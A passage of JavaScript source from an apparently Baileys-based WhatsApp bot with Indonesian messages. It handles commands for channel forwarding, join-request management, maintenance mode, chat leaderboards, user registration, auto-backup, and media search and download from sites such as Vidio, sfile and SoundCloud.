                        ppUrl = await sock.profilePictureUrl(user, "image");
                    } catch { }

                    // Waktu lokal WIB
                    const date = new Date();
                    const sendTime = new Intl.DateTimeFormat("id-ID", {
                        timeZone: "Asia/Jakarta",
                        hour: "2-digit",
                        minute: "2-digit",
                        second: "2-digit",
                        day: "2-digit",
                        month: "2-digit",
                        year: "2-digit",
                    })
                        .format(date)
                        .replace(/\//g, "-")
                        .replace(/, /g, " || ") + " WIB";

                    const caption = text || "no caption";

                    const contextInfo = {
                        mentionedJid: [user],
                        isForwarded: true,
                        forwardingScore: 256,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: idch,
                            newsletterName: "PESAN TERKIRIM DARI GROUP",
                            serverMessageId: -1,
                        },
                        externalAdReply: {
                            title: `Pengirim: ${name}`,
                            body: sendTime,
                            thumbnailUrl: ppUrl,
                            sourceUrl: saluranLink,
                            mediaType: 1,
                            renderLargerThumbnail: false,
                            showAdAttribution: true,
                        },
                    };

                    // Jika ada quoted media
                    if (m.quoted && m.quoted.fileSha256) {
                        const quoted = m.quoted;
                        const mime = quoted.mimetype || "";
                        const media = await quoted.download();

                        if (mime.includes("image")) {
                            await sock.sendMessage(idch, {
                                image: media,
                                caption: caption,
                                contextInfo,
                            });
                        } else if (mime.includes("video")) {
                            await sock.sendMessage(idch, {
                                video: media,
                                caption: caption,
                                contextInfo,
                            });
                        } else if (mime.includes("audio")) {
                            await sock.sendMessage(idch, {
                                audio: media,
                                ptt: true,
                                mimetype: mime,
                                contextInfo,
                            });
                        } else {
                            return reply("‼️ *MEDIA TIDAK DIDUKUNG*\nHanya gambar, video, audio.");
                        }
                    } else if (text) {
                        // Kirim teks saja
                        await sock.sendMessage(idch, {
                            text: caption,
                            contextInfo,
                        });
                    } else {
                        return reply("‼️ *FORMAT TIDAK LENGKAP*\nMasukkan teks atau reply media.");
                    }

                    // Konfirmasi ke user
                    await sock.sendMessage(
                        m.chat,
                        {
                            text: "✅ Berhasil mengirim ke channel!",
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 256,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: idch,
                                    newsletterName: "PESAN TERKIRIM KE SALURAN",
                                    serverMessageId: -1,
                                },
                                externalAdReply: {
                                    title: `Pengirim: ${name}`,
                                    body: sendTime,
                                    thumbnailUrl: ppUrl,
                                    sourceUrl: saluranLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: false,
                                },
                            },
                        },
                        { quoted: m }
                    );

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {

                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
                break;
            }

            case "unblock": {
                if (!isAn) return reply("Hanya owner.");
                if (!text) return reply("Masukkan nomor: .unblock 628xxxxxxxxxx");

                const nomor = text.trim().replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                await sock.updateBlockStatus(nomor, 'unblock');
                reply(`✅ ${nomor.split('@')[0]} berhasil di-unblock.`);

            }
                break;

            case "acc":
            case "accall":
            case "joinrequest":
            case "reqjoin": {
                // Cek admin & bot admin
                if (!isAdmin) return reply("Fitur ini khusus admin grup.");
                if (!isBotAdmin) return reply("Bot harus jadi admin grup untuk mengelola permintaan masuk.");

                const sub = args[0]?.toLowerCase() || "";
                const option = args.slice(1).join(" ").trim();

                if (!sub || !["list", "approve", "reject"].includes(sub)) {
                    return reply(
                        `📋 *KELOLA PERMINTAAN MASUK GRUP*\n\n` +
                        `Perintah:\n` +
                        `• ${prefix + command} list                  → lihat daftar permintaan\n` +
                        `• ${prefix + command} approve all           → terima semua\n` +
                        `• ${prefix + command} reject all            → tolak semua\n` +
                        `• ${prefix + command} approve 1|3|5         → terima nomor tertentu\n` +
                        `• ${prefix + command} reject 1|2            → tolak nomor tertentu`

                    );
                }

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const pendingList = await sock.groupRequestParticipantsList(m.chat);

                    if (!pendingList?.length) {
                        await sock.sendMessage(m.chat, { react: { text: "📭", key: m.key } });
                        return reply("📭 Tidak ada permintaan masuk yang tertunda saat ini.");
                    }

                    if (sub === "list") {
                        let text = `📋 *DAFTAR PERMINTAAN MASUK GRUP*\n\n`;
                        text += `Total: ${pendingList.length} permintaan\n\n`;

                        for (let i = 0; i < pendingList.length; i++) {
                            const req = pendingList[i];
                            const number = req.jid?.split('@')[0] || "Unknown";
                            const method = req.request_method || "-";
                            const time = req.request_time ? formatDate(req.request_time) : "-";

                            text += `*${i + 1}.* @${number}\n`;
                            text += `   📱 ${number}\n`;
                            text += `   📨 Metode: ${method}\n`;
                            text += `   🕐 ${time}\n\n`;
                        }

                        text += `> Gunakan ${prefix + command} approve/reject all atau nomor (contoh: 1|3|5)`;

                        const mentions = pendingList.map(r => r.jid);
                        await sock.sendMessage(m.chat, {
                            text: text,
                            mentions: mentions
                        }, { quoted: m });

                        await sock.sendMessage(m.chat, { react: { text: "📋", key: m.key } });
                        return;
                    }

                    const action = sub; // approve / reject
                    const label = action === "approve" ? "DITERIMA" : "DITOLAK";

                    let results = [];
                    let successCount = 0;

                    if (option.toLowerCase() === "all") {
                        const jids = pendingList.map(r => r.jid);
                        results = await sock.groupRequestParticipantsUpdate(m.chat, jids, action);
                    } else {
                        // Nomor tertentu (misal 1|3|5)
                        const indices = option.split('|').map(n => parseInt(n.trim()) - 1)
                            .filter(n => !isNaN(n) && n >= 0 && n < pendingList.length);

                        if (indices.length === 0) {
                            await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                            return reply("❌ Nomor tidak valid.\nGunakan `.acc list` untuk lihat daftar.");
                        }

                        const targets = indices.map(i => pendingList[i].jid);
                        results = await sock.groupRequestParticipantsUpdate(m.chat, targets, action);
                    }

                    // Hitung sukses/gagal
                    successCount = results.filter(r => r.status === 200 || r.status === "200" || !r.status).length;
                    const failed = results.length - successCount;

                    let textResult = `📊 *HASIL ${label} PERMINTAAN MASUK*\n\n`;
                    textResult += `Total diproses: ${results.length}\n`;
                    textResult += `✅ Berhasil: ${successCount}\n`;
                    textResult += `❌ Gagal: ${failed}\n\n`;

                    await reply(textResult);

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {

                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });



                    await reply(`❌ *GAGAL PROSES*`);
                }
                break;
            }

                // Fungsi format tanggal (sudah ada di kode asli kamu)
                function formatDate(timestamp) {
                    return new Intl.DateTimeFormat('id-ID', {
                        weekday: 'long',
                        day: 'numeric',
                        month: 'long',
                        year: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit'
                    }).format(new Date(timestamp * 1000));
                }


            case 'maintenance':
            case 'mtc':
            case 'maint':
            case 'maintenanceon':
            case 'maintenanceoff': {
                if (!isAn) {
                    return reply("❌ Hanya owner yang bisa mengakses fitur ini.");
                }

                const sub = args[0]?.toLowerCase() || 'status';

                if (sub === 'on' || sub === 'aktif') {
                    maintenanceMode = true;
                    maintenanceReason = args.slice(1).join(' ') || maintenanceReason;
                    saveMaintenance();

                    reply(
                        `✅ *MODE MAINTENANCE DI AKTIFKAN*\n\n` +
                        `Alasan: ${maintenanceReason}\n\n` +
                        `Sekarang hanya owner yang bisa menggunakan bot.\n` +
                        `Gunakan ${prefix}maintenance off untuk membuka kembali.`
                    );
                    break;
                }

                if (sub === 'off' || sub === 'nonaktif') {
                    maintenanceMode = false;
                    saveMaintenance();

                    reply(
                        `✅ *MODE MAINTENANCE DIMATIKAN*\n\n` +
                        `Bot kembali normal untuk semua pengguna.\n` +
                        `Terima kasih atas kesabarannya selama maintenance.`
                    );
                    break;
                }

                if (sub === 'set' || sub === 'reason') {
                    if (!text) return reply(`Masukkan alasan maintenance:\nContoh: ${prefix + command} set Perbaikan sistem besar-besaran`);
                    maintenanceReason = text;
                    saveMaintenance();
                    reply(`✅ Alasan maintenance diubah menjadi:\n"${maintenanceReason}"`);
                    break;
                }

                // Default: tampilkan status
                reply(
                    `🛠 *STATUS MAINTENANCE*\n\n` +
                    `Mode       : ${maintenanceMode ? 'AKTIF 🚧' : 'NONAKTIF ✅'}\n` +
                    `Alasan     : ${maintenanceReason}\n\n` +
                    `Perintah:\n` +
                    `• ${prefix + command} on [alasan opsional]` +
                    `• ${prefix + command} off` +
                    `• ${prefix + command} set <alasan baru>` +
                    `• ${prefix + command} status`
                );
                break;
            }


            case 'totalchat':
            case 'totalpesan':
            case 'toppesan':
            case 'topchat':
            case 'leaderboard': {
                if (!m.isGroup) return reply("Perintah ini hanya bisa digunakan di grup!");

                const groupData = getGroupData(m.chat);
                const chatStats = groupData.chatStats || {};

                // Convert ke array & sort descending
                const sorted = Object.entries(chatStats)
                    .map(([jid, data]) => ({
                        jid,
                        count: data.count || 0,
                        lastChat: data.lastChat || 0
                    }))
                    .sort((a, b) => b.count - a.count)
                    .slice(0, 15); // Top 15

                if (sorted.length === 0) {
                    return reply(

                        `> Belum ada data chat di grup ini.\n` +
                        `> Data akan tercatat otomatis setiap kali member mengirim pesan.`
                    );
                }

                let txt = `📊 *TOP PESAN ${groupName || 'Grup Ini'}*\n\n`;

                const medals = ['🥇', '🥈', '🥉'];

                for (let i = 0; i < sorted.length; i++) {
                    const { jid, count } = sorted[i];
                    const medal = medals[i] || `${i + 1}.`;
                    const number = jid.split('@')[0];

                    txt += `${medal} @${number}\n`;
                    txt += `    💬 *${count.toLocaleString('id-ID')}* pesan\n`;
                }

                // Total pesan
                const totalMessages = sorted.reduce((sum, u) => sum + u.count, 0);
                txt += `\n╭┈┈⬡「 📈 *TOTAL PESAN* 」\n`;
                txt += `┃ 👥 Member aktif: *${sorted.length}*\n`;
                txt += `┃ 💬 Total pesan: *${totalMessages.toLocaleString('id-ID')}*\n`;
                txt += `╰┈┈┈┈┈┈┈┈⬡\n\n`;
                txt += `> Data dihitung otomatis • Update real-time`;

                const mentions = sorted.map(u => u.jid);

                await sock.sendMessage(m.chat, {
                    text: txt,
                    mentions: mentions,
                    contextInfo: {
                        externalAdReply: {
                            title: "TOTAL PESAN",
                            body: `Grup: ${groupName || 'Ini'} • Total: ${totalMessages.toLocaleString('id-ID')} pesan`,
                            thumbnailUrl: "https://files.catbox.moe/1wvvk4.jpg",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });

                break;
            }

            case 'resetchat':
            case 'resetpesan':
            case 'resettotalchat': {
                if (!m.isGroup) return reply("Perintah ini hanya bisa digunakan di grup!");

                if (!isAdmin && !isAn) {
                    return reply("❌ Hanya admin grup atau owner bot yang bisa mereset statistik chat.");
                }

                const sub = args[0]?.toLowerCase() || '';

                if (sub !== 'confirm') {
                    return reply(
                        `⚠️ *PERINGATAN RESET DATA CHAT*\n\n` +
                        `Perintah ini akan *menghapus seluruh statistik chat* di grup ini.\n` +
                        `Termasuk ranking top pesan dan jumlah pesan semua member.\n` +
                        `Data tidak bisa dikembalikan setelah direset!\n` +
                        `Untuk melanjutkan, ketik:\n` +
                        `→ *${prefix + command} confirm*` +
                        `Atau batalkan dengan tidak mengetik apa-apa.`
                    );
                }

                // Proses reset
                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const groupData = getGroupData(m.chat);

                    if (!groupData.chatStats || Object.keys(groupData.chatStats).length === 0) {
                        return reply("📉 Tidak ada data chat yang perlu direset di grup ini.");
                    }

                    // Reset chatStats
                    groupData.chatStats = {};
                    saveGroupData(m.chat, groupData);

                    await reply(
                        `✅ *RESET TOTAL CHAT BERHASIL*\n` +
                        `Semua data jumlah pesan dan ranking top chat telah dihapus.` +
                        `Statistik akan mulai dihitung ulang dari sekarang.` +
                        `Gunakan ${prefix}totalchat untuk melihat data baru nanti.`
                    );

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (err) {

                    await reply("❌ Gagal mereset statistik chat. Coba lagi nanti.");
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }

                break;
            }


            case 'daftar':
            case 'register':
            case 'reg': {
                if (checkRegisteredUser(m.sender)) {
                    const user = getRegisteredUser(m.sender);
                    return await sock.sendMessage(m.chat, {
                        text: `Kamu sudah terdaftar!\n\n` +
                            `Nama     : ${user.name}\n` +
                            `Umur     : ${user.age} tahun\n` +
                            `Gender   : ${user.gender}\n` +
                            `Waktu    : ${user.time}\n` +
                            `SN       : ${user.serial}`,
                        contextInfo: {
                            externalAdReply: {
                                title: "SUDAH TERDAFTAR",
                                body: "Data Registrasi Kamu",
                                thumbnailUrl: "https://files.catbox.moe/4w7p17.jpg",
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                sourceUrl: "https://wa.me/6281371379077"
                            }
                        }
                    }, { quoted: m });
                }

                if (!text) {
                    return reply(
                        `Format salah!\n\n` +
                        `Contoh: ${prefix + command} Vanness|17|laki-laki\n` +
                        `(Nama|Umur|Gender)`
                    );
                }

                const parts = text.split('|').map(v => v.trim());
                if (parts.length < 3) {
                    return reply("Format: nama|umur|gender\nContoh: Vanness|17|laki-laki");
                }

                const nama = parts[0];
                const umurStr = parts[1];
                const gender = parts[2].toLowerCase();

                const umur = parseInt(umurStr);
                if (isNaN(umur) || umur < 10 || umur > 100) {
                    return reply("Umur harus angka antara 10-100 tahun.");
                }

                if (!['laki-laki', 'perempuan', 'lainnya'].includes(gender)) {
                    return reply("Gender hanya boleh: laki-laki / perempuan / lainnya");
                }

                const waktuDaftar = moment.tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss');
                const serial = createSerial(18);

                addRegisteredUser(m.sender, nama, umur, gender, waktuDaftar, serial);

                await sock.sendMessage(m.chat, {
                    text: `✅ *PENDAFTARAN BERHASIL*\n\n` +
                        `Nama     : ${nama}\n` +
                        `Umur     : ${umur} tahun\n` +
                        `Gender   : ${gender.charAt(0).toUpperCase() + gender.slice(1)}\n` +
                        `Waktu    : ${waktuDaftar}\n` +
                        `Serial Number (SN): \`${serial}\`\n\n` +
                        `Simpan SN kamu dengan baik!\n` +
                        `Gunakan ${prefix}ceksn untuk cek data kamu.`,
                    contextInfo: {
                        externalAdReply: {
                            title: "PENDAFTARAN BERHASIL",
                            body: "Selamat! Kamu sudah terdaftar",
                            thumbnailUrl: "https://files.catbox.moe/4w7p17.jpg",
                            mediaType: 1,
                            renderLargerThumbnail: true,
                            sourceUrl: "https://wa.me/6281371379077"
                        }
                    }
                }, { quoted: m });

                // Kirim ke owner
                if (global.owner && global.owner[0]) {
                    sock.sendMessage(global.owner[0] + '@s.whatsapp.net', {
                        text: `User baru terdaftar!\n` +
                            `Nama: ${nama}\n` +
                            `Umur: ${umur}\n` +
                            `Gender: ${gender}\n` +
                            `SN: ${serial}\n` +
                            `ID: ${m.sender.split('@')[0]}`
                    });
                }

                break;
            }

            case 'ceksn':
            case 'cekserial':
            case 'mysn': {
                if (!checkRegisteredUser(m.sender)) {
                    return reply(`Kamu belum terdaftar!\nDaftar dulu dengan ${prefix}daftar nama|umur|gender`);
                }

                const user = getRegisteredUser(m.sender);

                await sock.sendMessage(m.chat, {
                    text: `📋 *DATA REGISTRASI KAMU*\n\n` +
                        `Nama     : ${user.name}\n` +
                        `Umur     : ${user.age} tahun\n` +
                        `Gender   : ${user.gender.charAt(0).toUpperCase() + user.gender.slice(1)}\n` +
                        `Waktu Daftar : ${user.time}\n` +
                        `Serial Number : \`${user.serial}\``,
                    contextInfo: {
                        externalAdReply: {
                            title: "DATA REGISTRASI",
                            body: "Informasi Akun Kamu",
                            thumbnailUrl: "https://files.catbox.moe/4w7p17.jpg",
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m });

                break;
            }












            case 'unreg':
            case 'hapusakun':
            case 'unregister': {
                if (!checkRegisteredUser(m.sender)) {
                    return reply("Kamu belum terdaftar, jadi tidak bisa hapus akun.");
                }

                const sub = args[0]?.toLowerCase() || '';

                if (sub !== 'confirm') {
                    return await sock.sendMessage(m.chat, {
                        text: `⚠️ *PERINGATAN HAPUS AKUN*\n\n` +
                            `Ini akan menghapus seluruh data registrasi kamu secara permanen.\n` +
                            `Data tidak bisa dikembalikan!\n\n` +
                            `Untuk melanjutkan, ketik:\n` +
                            `${prefix + command} confirm`,
                        buttons: [
                            {
                                buttonId: `${prefix}unreg confirm`,
                                buttonText: { displayText: 'YA, HAPUS AKUN SAYA' },
                                type: 1
                            },
                            {
                                buttonId: 'batal',
                                buttonText: { displayText: 'BATAL' },
                                type: 1
                            }
                        ],
                        headerType: 1,
                        contextInfo: {
                            externalAdReply: {
                                title: "HAPUS AKUN",
                                body: "Konfirmasi Penghapusan Data",
                                thumbnailUrl: "https://files.catbox.moe/4w7p17.jpg",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: m });
                }

                // Proses hapus
                const berhasil = removeRegisteredUser(m.sender);

                if (berhasil) {
                    await reply(
                        `✅ *AKUN BERHASIL DIHAPUS*\n\n` +
                        `Semua data registrasi kamu telah dihapus permanen.\n` +
                        `Kamu bisa daftar ulang kapan saja dengan ${prefix}daftar`,
                        {
                            contextInfo: {
                                externalAdReply: {
                                    title: "AKUN DIHAPUS",
                                    body: "Data berhasil dihapus",
                                    thumbnailUrl: "https://files.catbox.moe/4w7p17.jpg",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        }
                    );
                } else {
                    await reply("Gagal menghapus akun. Coba lagi atau hubungi owner.");
                }

                break;
            }

            case 'vidio':
            case 'playvidio':
            case 'cari vidio':
            case 'vid': {
                if (!text) return reply(`Masukkan judul video Vidio yang ingin dicari.\nContoh: ${prefix + command} arafta terbelenggu takdir`);

                await sock.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

                try {
                    const result = await vidioSearchAndReport(text);

                    if (!result.success) {
                        return reply(`❌ ${result.message}`);
                    }

                    let caption = `🎬 *${result.title}*\n\n` +
                        `${result.description}\n\n` +
                        `⏱ Durasi : ${result.duration}\n` +
                        `Genre    : ${result.genres}\n\n` +
                        `🔗 Link: ${result.url}\n` +
                        `📊 Status: ${result.reported}`;

                    await sock.sendMessage(m.chat, {
                        image: { url: result.thumbnail },
                        caption: caption,
                        contextInfo: {
                            externalAdReply: {
                                title: result.title,
                                body: "Video Vidio • @VannessWangsaff",
                                thumbnailUrl: result.thumbnail,
                                sourceUrl: result.url,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (err) {
                    console.error('[VIDIO ERROR]', err);
                    await reply(`❌ Gagal memproses pencarian Vidio.\n${err.message || 'Error tidak diketahui'}`);
                    await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }

                break;
            }


            case "getsw": {
                if (!isAdmin && !isAn)
                    return reply(mess.owner);
                if (!m.quoted) return m.reply("Reply group status / status WhatsApp yang mau diambil.");

                const q = m.quoted;
                const msg = q.message || q.msg || {};
                const type = Object.keys(msg)[0];

                // Teks
                if (type === "conversation" || type === "extendedTextMessage") {
                    const text = msg.conversation || msg.extendedTextMessage?.text || "";
                    if (!text) return m.reply("Quoted text kosong.");

                    return sock.sendMessage(m.chat, { text: text }, { quoted: m });
                }

                // Media (image, video, audio)
                if (!["imageMessage", "videoMessage", "audioMessage"].includes(type)) {
                    return m.reply("Hanya bisa untuk gambar, video, audio, atau teks dari status.");
                }

                const mediaType = type === "imageMessage" ? "image"
                    : type === "videoMessage" ? "video"
                        : "audio";

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                const stream = await downloadContentFromMessage(msg[type], mediaType);
                let buffer = Buffer.alloc(0);
                for await (const chunk of stream) {
                    buffer = Buffer.concat([buffer, chunk]);
                }

                if (type === "imageMessage") {
                    await sock.sendMessage(m.chat, { image: buffer }, { quoted: m });
                } else if (type === "videoMessage") {
                    await sock.sendMessage(m.chat, { video: buffer }, { quoted: m });
                } else {
                    await sock.sendMessage(m.chat, {
                        audio: buffer,
                        mimetype: "audio/mp4",
                        ptt: false
                    }, { quoted: m });
                }

                await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            }
                break;


            case 'autobackup':
            case 'setautobackup':
            case 'backupauto':
            case 'autobackupset': {
                if (!isAn) return reply(mess.owner);

                const sub = text.toLowerCase().trim();

                if (sub === 'on' || sub === 'aktif') {
                    global.autoBackup = true;

                    // Simpan permanen ke file config (biar nyala lagi setelah restart)
                    const config = JSON.parse(fs.readFileSync('./data/setbot.json', 'utf-8') || '{}');
                    config.autoBackup = true;
                    fs.writeFileSync('./data/setbot.json', JSON.stringify(config, null, 2));

                    // Start interval kalau belum ada
                    if (!global.backupInterval) {
                        global.backupInterval = setInterval(() => {
                            autoBackupScript(global.sock);
                        }, 24 * 60 * 60 * 1000);
                        autoBackupScript(global.sock); // langsung backup pertama
                    }

                    reply("✅ Auto backup **diaktifkan** (setiap 1 hari sekali).\nBackup akan dikirim ke owner.");
                    break;
                }

                if (sub === 'off' || sub === 'matikan') {
                    global.autoBackup = false;

                    // Simpan ke config
                    const config = JSON.parse(fs.readFileSync('./data/setbot.json', 'utf-8') || '{}');
                    config.autoBackup = false;
                    fs.writeFileSync('./data/setbot.json', JSON.stringify(config, null, 2));

                    // Clear interval
                    if (global.backupInterval) {
                        clearInterval(global.backupInterval);
                        global.backupInterval = null;
                    }

                    reply("✅ Auto backup **dimatikan**.");
                    break;
                }

                if (sub === 'now' || sub === 'backup') {
                    if (!global.sock) return reply("Bot belum siap. Coba lagi nanti.");
                    reply("⏳ Sedang membuat backup manual...");
                    await autoBackupScript(global.sock);
                    reply("✅ Backup manual selesai! Cek chat owner.");
                    break;
                }

                // Status & bantuan
                reply(
                    `🛡️ *Auto Backup System*\n\n` +
                    `Status : ${global.autoBackup ? 'AKTIF ✅' : 'MATI ❌'}\n` +


                    `Perintah:\n` +
                    `• ${prefix + command} on\n` +
                    `• ${prefix + command} off\n` +
                    `• ${prefix + command} now`
                );
                break;
            }














            case 'donghua': {
                if (!text) return m.reply(`Contoh: ${prefix + command} renegade immortal`);

                // Jika input yang diketik user adalah link dari bot tadi
                if (text.includes('nontonanimeid.my.id')) {
                    await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
                    const videoLink = await getDownloadLink(text);
                    if (!videoLink) return m.reply("Gagal mengambil link video. Kemungkinan video diproteksi.");

                    let teks = `✅ *LINK BERHASIL DIAMBIL*\n\n`;
                    teks += `Saran: Copy link di bawah dan buka di Chrome/Browser HP kamu untuk nonton/download.\n\n`;
                    teks += `🔗 *Link:* ${videoLink}`;

                    return m.reply(teks);
                }

                // Proses Pencarian Judul
                await sock.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
                const res = await searchDonghua(text);

                if (!res.success || res.episodes.length === 0) {
                    return m.reply("❌ *Donghua tidak ditemukan.*\nPastikan ejaan benar atau coba gunakan kata kunci yang lebih singkat (Contoh: 'Renegade' saja).");
                }

                let teks = `🎬 *${res.title}*\n\n`;
                teks += `Ditemukan *${res.episodes.length}* Episode. Silahkan *salin & kirim kembali* link episode yang ingin ditonton:\n\n`;

                // Tampilkan 10 episode terbaru saja supaya chat tidak kepanjangan
                const showEps = res.episodes.slice(0, 15);
                showEps.forEach((v) => {
                    teks += `▪️ *Episode ${v.title}*\n${v.url}\n\n`;
                });

                if (res.episodes.length > 15) teks += `_...dan ${res.episodes.length - 15} episode lainnya._`;

                await sock.sendMessage(m.chat, {
                    image: { url: res.thumb || 'https://via.placeholder.com/500' },
                    caption: teks
                }, { quoted: m });
            }
                break;







            case 'toaudio':
            case 'tomp3':
            case 'audio':
            case 'mp3': {
                const quoted = m.quoted ? m.quoted : m;
                const mime = quoted?.msg?.mimetype || quoted?.mimetype || '';

                if (!quoted) return reply(`Reply video/audio dengan caption ${prefix + command}`);

                if (!/video|audio/.test(mime)) {
                    return reply(`Hanya support reply video atau audio!\n\nContoh:\nReply video → ketik ${prefix + command}`);
                }

                await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

                try {
                    // Download media (pakai buffer, lebih aman daripada save file)
                    const mediaBuffer = await quoted.download();

                    if (!mediaBuffer || mediaBuffer.length < 100) {
                        throw new Error('Media kosong atau gagal di-download');
                    }

                    // Kirim sebagai audio MP3 (mpeg)
                    await sock.sendMessage(m.chat, {
                        audio: mediaBuffer,
                        mimetype: 'audio/mpeg',
                        ptt: false,
                        caption: '✅ Video / Audio berhasil diubah menjadi MP3!'
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: '🎵', key: m.key } });

                } catch (err) {
                    console.error('[TOAUDIO ERROR]', err.message || err);
                    reply(`Gagal mengubah ke audio.\nCoba reply media lain atau restart bot.`);
                    await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
                break;
            }


            case 'autoai':
            case 'autopplx': {
                if (!m.isGroup) return reply(mess.group);
                if (!isAdmin && !isAn) return reply(mess.admin);

                const autoAiFile = './data/autoai.json';

                // Bikin file JSON otomatis kalau belum ada
                if (!fs.existsSync(autoAiFile)) {
                    fs.writeFileSync(autoAiFile, JSON.stringify([]));
                }

                let autoAiData = JSON.parse(fs.readFileSync(autoAiFile));
                const sub = args[0]?.toLowerCase();

                if (sub === 'on') {
                    if (autoAiData.includes(m.chat)) return reply('🤖 Auto AI sudah aktif di grup ini.');
                    autoAiData.push(m.chat);
                    fs.writeFileSync(autoAiFile, JSON.stringify(autoAiData, null, 2));
                    reply('✅ Fitur Auto AI (Perplexity) berhasil diaktifkan untuk grup ini.\nBot akan merespons jika dipanggil atau di-tag.');
                } else if (sub === 'off') {
                    if (!autoAiData.includes(m.chat)) return reply('🤖 Auto AI belum aktif di grup ini.');
                    autoAiData = autoAiData.filter(id => id !== m.chat);
                    fs.writeFileSync(autoAiFile, JSON.stringify(autoAiData, null, 2));
                    reply('❌ Fitur Auto AI berhasil dimatikan di grup ini.');
                } else {
                    const status = autoAiData.includes(m.chat) ? 'AKTIF ✅' : 'NONAKTIF ❌';
                    reply(`*⚙️ STATUS AUTO AI GRUP*\n\nStatus saat ini: ${status}\n\nKetik:\n*${prefix + command} on* (untuk mengaktifkan)\n*${prefix + command} off* (untuk mematikan)`);
                }
                break;
            }


            case 'sfile': {
                if (!text) return reply(`Contoh penggunaan:\n*${prefix + command} search naruto*\n*${prefix + command} dl https://sfile.co/xxxx*`)
                const args = text.split(" ")
                const type = args[0].toLowerCase()
                const query = args.slice(1).join(" ")

                if (type === 'search') {
                    if (!query) return reply("Masukkan kata kunci pencarian!")
                    await sock.sendMessage(m.chat, { react: { text: "🔍", key: m.key } })
                    try {
                        let res = await sfile.search(query)
                        if (res.length === 0) return reply("File tidak ditemukan.")
                        let teks = `*Sfile Searching...*\n\n`
                        res.forEach((v, i) => {
                            teks += `*${i + 1}.* さName ${v.title}\n`
                            teks += `╰┈➤ Size: ${v.size} | Upload: ${v.upload_at}\n`
                            teks += `╰┈➤ Link: ${v.link}\n\n`
                        })
                        teks += `Gunakan *${prefix + command} dl <link>* untuk mendownload`
                        reply(teks)
                    } catch (e) {
                        console.log(e)
                        reply("Terjadi kesalahan saat mencari file.")
                    }
                } else if (type === 'dl' || type === 'download') {
                    if (!query || !query.includes('sfile.co')) return reply("Masukkan link sfile yang valid!")
                    await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })
                    try {
                        // Kita ambil link download (URL-nya saja)
                        let res = await sfile.download(query, false)
                        let meta = res.metadata

                        let caption = `*Sfile download*\n\n`
                        caption += `📁 *Nama:* ${meta.filename}\n`
                        caption += `📦 *Mime:* ${meta.mimetype}\n`
                        caption += `📥 *Download:* ${meta.download_count}\n`
                        caption += `👤 *Author:* ${meta.author_name}\n\n`
                        caption += `_Sabar, file sedang dikirim..._`

                        await reply(caption)

                        // Kirim filenya sebagai dokumen
                        await sock.sendMessage(m.chat, {
                            document: { url: res.download },
                            fileName: meta.filename,
                            mimetype: 'application/octet-stream' // Biar universal
                        }, { quoted: m })

                    } catch (e) {
                        console.log(e)
                        reply(`Gagal mendownload: ${e.message}`)
                    }
                } else {
                    reply(`Contoh penggunaan:\n*${prefix + command} search naruto*\n*${prefix + command} dl <link sfile>*`)
                }
            }
                break

            case 'soundcloud':
            case 'scdl': {
                if (!text) return reply(`Contoh penggunaan:\n*${prefix + command} https://soundcloud.com/xxxx*`);
                if (!text.includes('soundcloud.com')) return reply("Itu bukan link SoundCloud yang valid!");

                await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                try {
                    const result = await downcloudme(text);

                    if (!result || result.length === 0) return reply("File tidak ditemukan atau link tidak didukung.");

                    // Jika link adalah playlist, kita ambil track pertama saja atau kasih pilihan.
                    // Di sini kita ambil track pertama untuk kemudahan download langsung.
                    const track = result[0];

                    let teks = `🎧 *SOUNDCLOUD DOWNLOADER*\n\n`;
                    teks += `📌 *Judul:* ${track.title}\n`;
                    teks += `⏱️ *Durasi:* ${track.duration}\n`;
                    teks += `❤️ *Likes:* ${track.likes}\n\n`;
                    teks += `_Sabar bro, audio lagi dikirim..._`;

                    // Kirim info & thumbnail
                    await sock.sendMessage(m.chat, {
                        image: { url: track.image },
                        caption: teks
                    }, { quoted: m });

                    // Kirim file Audio
                    await sock.sendMessage(m.chat, {
                        audio: { url: track.download_url },
                        mimetype: 'audio/mpeg',
                        fileName: `${track.title}.mp3`
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (e) {
                    console.error(e);
                    reply("Terjadi kesalahan: " + e.message);
                    await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
            }
                break;

            case 'cetakstruk':
            case 'struk': {
                const args = text ? text.split("|").map(s => s.trim()) : [];

